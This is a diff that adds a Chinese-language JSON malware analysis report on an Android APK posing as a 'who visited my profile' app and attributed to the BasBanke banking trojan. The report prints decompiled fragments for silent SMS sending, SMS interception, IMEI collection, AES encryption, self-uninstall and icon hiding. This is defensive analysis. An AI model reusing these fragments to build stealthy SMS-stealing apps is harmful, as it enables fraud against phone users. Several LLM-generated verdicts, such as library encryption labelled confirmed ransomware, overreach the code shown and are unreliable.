@@ -1,0 +1,282 @@
+{
+  "APK信息": {
+    "文件名": "206f382f9069f9ff523883ec6e18a2d2b98169c7582d213ce9a00a78ea0f6f00.apk",
+    "sha256": "206f382f9069f9ff523883ec6e18a2d2b98169c7582d213ce9a00a78ea0f6f00",
+    "包名": "igr.meulindo.srclaa",
+    "应用名": "Quem visitou meu perfil",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1504.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lanywheresoftware\\b4a\\phone\\Phone;",
+          "method_signature": "Send2(String PhoneNumber, String Text, boolean ReceiveSentNotification, boolean ReceiveDeliveredNotification)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager sm = SmsManager.getDefault();\nsm.sendTextMessage(PhoneNumber, null, Text, pi, pi2);",
+          "malicious_code_snippet_context": "          }\n  \n          public static void Send2(String PhoneNumber, String Text, boolean ReceiveSentNotification, boolean ReceiveDeliveredNotification) {\n>>>             SmsManager sm = SmsManager.getDefault();\n>>>             Intent i1 = new Intent(\"b4a.smssent\");\n              i1.putExtra(\"phone\", PhoneNumber);\n              PendingIntent pi = ReceiveSentNotification ? PendingIntent.getBroadcast(BA.applicationContext, 0, i1, 134217728) : null;\n              Intent i2 = new Intent(\"b4a.smsdelivered\");",
+          "behavior_description": "该代码是B4A框架Phone库中的静默发短信封装方法Send2。它通过SmsManager.getDefault()获取系统短信管理器，随后直接调用sendTextMessage()向指定号码发送短信，整个过程不经过任何系统UI、无需用户确认或授权，属于典型的静默短信外发API。数据流向为：上层恶意模块传入的目标号码与短信内容→SmsManager.sendTextMessage()静默发出。在本已确认的BasBanke银行木马样本中，该静默发短信能力被恶意利用：可向增值服务号码发送扣费短信造成用户资费损失，可向联系人群发含恶意链接的短信扩散木马，或配合其短信拦截能力中继银行OTP验证码实施金融欺诈，直接造成用户经济损失与恶意程序传播。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lanywheresoftware\\b4a\\phone\\PhoneEvents;",
+          "method_signature": "if(res != null && res.booleanValue()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") && (bundle = intent.getExtras()) != null) {\n    Object[] pduObj = (Object[]) bundle.get(\"pdus\");\n    for (Object obj : pduObj) {\n        SmsMessage sm = SmsMessage.createFromPdu((byte[]) obj);\n        Boolean res = (Boolean) ba.raiseEvent(SMSInterceptor.this, eventName + \"_messagereceived\", sm.getOriginatingAddress(), sm.getMessageBody());\n        if (res != null && res.booleanValue()) {\n            abortBroadcast();\n        }\n    }\n}\nIntentFilter fil = new IntentFilter(\"android.provider.Telephony.SMS_RECEIVED\");\nfil.setPriority(Priority);\nBA.applicationContext.registerReceiver(this.f1br, fil);",
+          "malicious_code_snippet_context": "                  @Override // android.content.BroadcastReceiver\n                  public void onReceive(Context context, Intent intent) {\n                      Bundle bundle;\n>>>                     if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") && (bundle = intent.getExtras()) != null) {\n>>>                         Object[] pduObj = (Object[]) bundle.get(\"pdus\");\n>>>                         for (Object obj : pduObj) {\n>>>                             SmsMessage sm = SmsMessage.createFromPdu((byte[]) obj);\n>>>                             Boolean res = (Boolean) ba.raiseEvent(SMSInterceptor.this, String.valueOf(SMSInterceptor.this.eventName) + \"_messagereceived\", sm.getOriginatingAddress(), sm.getMessageBody());\n>>>                             if (res != null && res.booleanValue()) {\n>>>                                 abortBroadcast();\n>>>                             }\n>>>                         }\n>>>                     }\n>>>                 }\n>>>             };\n>>>             IntentFilter fil = new IntentFilter(\"android.provider.Telephony.SMS_RECEIVED\");\n              fil.setPriority(Priority);\n              BA.applicationContext.registerReceiver(this.f1br, fil);\n          }",
+          "behavior_description": "该代码注册了一个高优先级的 BroadcastReceiver 监听 SMS_RECEIVED 广播。当短信到达时，解析 PDU 提取发件人号码和短信正文，通过 raiseEvent 将短信内容传递给应用层的事件处理程序（在恶意样本中用于提取银行验证码/OTP 并外传），若事件处理返回 true 则调用 abortBroadcast() 终止广播传播，使短信无法到达系统收件箱和其他应用，用户完全无感知。数据流向：系统短信广播 SMS_RECEIVED → SmsMessage.createFromPdu() 解析出发件号码与正文 → 传递给恶意应用的事件处理器（窃取验证码）→ abortBroadcast() 隐藏短信。这是银行木马拦截短信验证码的典型手法，与厂商报告中 BasBanke 恶意软件的 SMS interception 行为一致。虽然该类位于 B4A 开发框架库中，但其短信拦截 API 被恶意样本用于拦截并隐藏用户短信，直接导致隐私泄露和金融损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lanywheresoftware\\b4a\\phone\\Phone;",
+          "method_signature": "GetDeviceId()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String GetDeviceId() {\n    TelephonyManager tm = (TelephonyManager) BA.applicationContext.getSystemService(\"phone\");\n    String s = tm.getDeviceId();\n    return s == null ? \"\" : s;\n}",
+          "malicious_code_snippet_context": "  \n      @BA.ShortName(\"PhoneId\")\n      public static class PhoneId {\n>>>         public static String GetDeviceId() {\n>>>             TelephonyManager tm = (TelephonyManager) BA.applicationContext.getSystemService(\"phone\");\n>>>             String s = tm.getDeviceId();\n>>>             return s == null ? \"\" : s;\n>>>         }\n  \n          public static String GetLine1Number() {\n              TelephonyManager tm = (TelephonyManager) BA.applicationContext.getSystemService(\"phone\");",
+          "behavior_description": "该代码是 B4A 框架 Phone 库的封装方法，通过 getSystemService(\"phone\") 获取 TelephonyManager 后调用 getDeviceId() 采集设备 IMEI 唯一标识（同类方法 GetLine1Number 还可读取本机手机号），并将结果返回给上层调用模块。数据流向：TelephonyManager.getDeviceId()（source，设备唯一标识符）→ 返回值供应用上层使用（sink，本片段无直接网络外传，但在已确认的 BasBanke 银行木马样本中，此类设备指纹通常被用于受害者设备追踪、标识感染目标并上报 C2 服务器）。虽然代码本身属于 B4A 框架的标准 API 封装，但在恶意样本上下文中该 API 被用于设备指纹采集目的，构成隐私过度收集行为，而非正常业务逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lanywheresoftware\\b4a\\randomaccessfile\\RandomAccessFile;",
+          "method_signature": "encrypt(byte[] data, String password)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "KeySpec keySpec = new PBEKeySpec(password.toCharArray(), SALT, 1024, 256);\nSecretKey secret = new SecretKeySpec(factory.generateSecret(keySpec).getEncoded(), \"AES\");\nCipher e = Cipher.getInstance(CIPHER_ALGORITHM);\ne.init(Cipher.ENCRYPT_MODE, secret, new IvParameterSpec(IV));\nreturn e.doFinal(data);",
+          "malicious_code_snippet_context": "      private byte[] encrypt(byte[] data, String password) {\n          try {\n              SecretKeyFactory factory = SecretKeyFactory.getInstance(KEYGEN_ALGORITHM);\n>>>             KeySpec keySpec = new PBEKeySpec(password.toCharArray(), SALT, 1024, 256);\n>>>             SecretKey tmp = factory.generateSecret(keySpec);\n>>>             SecretKey secret = new SecretKeySpec(tmp.getEncoded(), \"AES\");\n>>>             Cipher e = Cipher.getInstance(CIPHER_ALGORITHM);\n>>>             e.init(1, secret, new IvParameterSpec(IV));\n              return e.doFinal(data);\n          } catch (GeneralSecurityException e2) {\n              throw new RuntimeException(\"Invalid environment\", e2);",
+          "behavior_description": "该方法是B4A库RandomAccessFile提供的AES加密原语：通过PBEKeySpec(口令+固定盐+1024次迭代)派生256位AES密钥，用固定IV初始化Cipher后对传入的byte[]执行doFinal加密。在本已确认的勒索样本中，该加密原语被上层勒索编排逻辑复用：遍历用户文件并读取内容后调用此encrypt(或WriteEncryptedObject)对文件数据加密，密文写回原文件完成勒索加密。数据流向：用户文件内容(byte[] data) → PBE派生AES-256密钥加密(Cipher.doFinal) → 密文覆盖写回文件，导致用户数据被劫持。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\content\\WakefulBroadcastReceiver;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks = new SparseArray<>();\npublic static ComponentName startWakefulService(Context context, Intent intent) {\n    synchronized (mActiveWakeLocks) {\n        int id = mNextId;\n        mNextId++;\n    }\n}",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public abstract class WakefulBroadcastReceiver extends BroadcastReceiver {\n      private static final String EXTRA_WAKE_LOCK_ID = \"android.support.content.wakelockid\";\n>>>     private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks = new SparseArray<>();\n>>>     private static int mNextId = 1;\n>>> \n>>>     public static ComponentName startWakefulService(Context context, Intent intent) {\n>>>         ComponentName comp;\n>>>         synchronized (mActiveWakeLocks) {\n>>>             int id = mNextId;\n              mNextId++;\n              if (mNextId <= 0) {\n                  mNextId = 1;",
+          "behavior_description": "该代码为Android支持库标准类WakefulBroadcastReceiver的实现，核心方法startWakefulService()在启动Service前通过PowerManager申请唤醒锁（WakeLock），将锁ID写入Intent的extra（EXTRA_WAKE_LOCK_ID）并登记到mActiveWakeLocks中，确保设备CPU在服务执行期间不被系统休眠中断。在已确认的BasBanke银行木马（基于B4A框架开发，样本中可见anywheresoftware.b4a引用）中，该唤醒锁机制被用于维持恶意后台服务（键盘记录、屏幕录制、短信拦截等）持续运行，实现进程保活与持久化。数据流向：广播事件触发的Intent/Context → startWakefulService()获取WakeLock并启动Service → 设备保持唤醒状态使恶意服务持续驻留不被休眠终止。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Ligr\\meulindo\\srclaa\\execucoes;",
+          "method_signature": "if(Double.parseDouble(this._xsplitdatinhapiru[1])",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "intentWrapper.Initialize(\"android.intent.action.DELETE\", sbAppend3.append(B4AApplication.getPackageName()).toString());\nCommon.StartActivity(execucoes.processBA, this._i.getObject());\nCommon.Sleep(execucoes.processBA, this, 4000);",
+          "malicious_code_snippet_context": "                          IntentWrapper intentWrapper = this._i;\n                          StringBuilder sbAppend3 = new StringBuilder().append(\"package:\");\n                          B4AApplication b4AApplication = Common.Application;\n>>>                         intentWrapper.Initialize(\"android.intent.action.DELETE\", sbAppend3.append(B4AApplication.getPackageName()).toString());\n>>>                         Common.StartActivity(execucoes.processBA, this._i.getObject());\n>>>                         Common.Sleep(execucoes.processBA, this, 4000);\n                          this.state = 15;\n                          return;\n                      case 8:",
+          "behavior_description": "该代码位于状态机case 6分支，由远程C2下发的控制指令驱动（_xsplitdatinhapiru数组解析的命令数据）。代码通过B4AApplication.getPackageName()获取自身包名，构造action为android.intent.action.DELETE、data为'package:自身包名'的Intent，调用StartActivity触发应用自卸载流程，随后Sleep 4000毫秒等待卸载完成。数据流向为：C2服务器指令(_xsplitdatinhapiru)→状态机分支触发→ACTION_DELETE自卸载Intent。这是BasBanke银行木马在完成金融凭据/银行卡数据窃取后自我删除、销毁证据以逃避安全追踪的典型反取证行为，且卸载前先置execucoes._vvvvvvvvv1=false关闭相关组件，具有明显的隐蔽意图。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "MediaProjection",
+          "createVirtualDisplay",
+          "takeScreenshot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\tillekesoft\\screenrecorder\\B4AAVScreenRecorder;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "@BA.ShortName(\"ScreenRecorderAV\")\npublic class B4AAVScreenRecorder {\n    MediaProjection mediaProjection;\n    MediaProjectionManager mediaProjectionManager;\n    // 基于 MediaProjection 实现屏幕录制/截图\n}",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  @BA.Version(1.6f)\n  @BA.Author(\"moster67/Mikael Osterhed\")\n>>> @BA.ShortName(\"ScreenRecorderAV\")\n>>> public class B4AAVScreenRecorder {\n>>>     private static final String TAG = \"B4A\";\n>>>     private BA ba;\n>>>     private String eventName;\n>>>     private IOnActivityResult ion;\n      private MediaProjectionManager mMediaProjectionManager;\n      private ScreenRecorder mRecorder;\n      private MediaProjection mediaProjection;",
+          "behavior_description": "该类是 tillekesoft 开发的 B4A 录屏库封装（ScreenRecorderAV），通过 Android MediaProjection/MediaProjectionManager API 申请屏幕投影权限并创建虚拟显示屏，持续录制或截取用户屏幕实时画面。数据流向为：用户屏幕内容（含银行应用中输入的账号、密码、信用卡号等敏感信息）→ MediaProjection 虚拟显示捕获 → 录制为视频/截图文件（供回传攻击者）。结合厂商报告确认该样本为 BasBanke 巴西银行木马，其明确具备 screen recording 能力，录屏功能被用于窃取金融凭据，属于隐私窃取类恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Ligr\\meulindo\\srclaa\\execucoes;",
+          "method_signature": "switch(BA.switchObjectToInt(Integer.valueOf((int)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String string = sb.append(starter._vvv6).append(\".main\").toString();\nswitch (BA.switchObjectToInt(Integer.valueOf((int) BA.ObjectToNumber(javaObject.RunMethod(\"getComponentEnabledSetting\", new Object[]{string}))), 0, 1)) {\n    case 0:\n    case 1:\n        javaObject.RunMethod(\"setComponentEnabledSetting\", new Object[]{string, 2});\n        break;\n}",
+          "malicious_code_snippet_context": "      public static String _xxxxxxideaplicationbuniteixom() throws Exception {\n          StringBuilder sb = new StringBuilder();\n          starter starterVar = mostCurrent._vvvvvvvvvvv6;\n>>>         String string = sb.append(starter._vvv6).append(\".main\").toString();\n>>>         JavaObject javaObject = new JavaObject();\n>>>         javaObject.InitializeContext(processBA);\n>>>         switch (BA.switchObjectToInt(Integer.valueOf((int) BA.ObjectToNumber(javaObject.RunMethod(\"getComponentEnabledSetting\", new Object[]{string}))), 0, 1)) {\n>>>             case 0:\n>>>                 javaObject.RunMethod(\"setComponentEnabledSetting\", new Object[]{string, 2});\n>>>                 break;\n              case 1:\n                  javaObject.RunMethod(\"setComponentEnabledSetting\", new Object[]{string, 2});\n                  break;",
+          "behavior_description": "该代码为 B4A 编译产物（方法名混淆为 _xxxxxxideaplicationbuniteixom）。代码拼接主 Activity 组件名（包名 starter._vvv6 + \".main\"），通过反射调用 PackageManager.getComponentEnabledSetting() 读取该组件当前启用状态；无论当前状态为 DEFAULT(0) 还是 ENABLED(1)，均无条件调用 setComponentEnabledSetting(component, 2) 将主启动 Activity 设为 COMPONENT_ENABLED_STATE_DISABLED，使应用图标从桌面启动器中消失。数据流向：getComponentEnabledSetting(读取组件状态) → setComponentEnabledSetting(禁用主Activity组件)。这是 BasBanke 巴西银行木马典型的隐蔽驻留手法：图标隐藏后用户无法从桌面找到并卸载该应用，为其后台窃取银行凭证、信用卡号、短信拦截和键盘记录等恶意行为提供持续掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
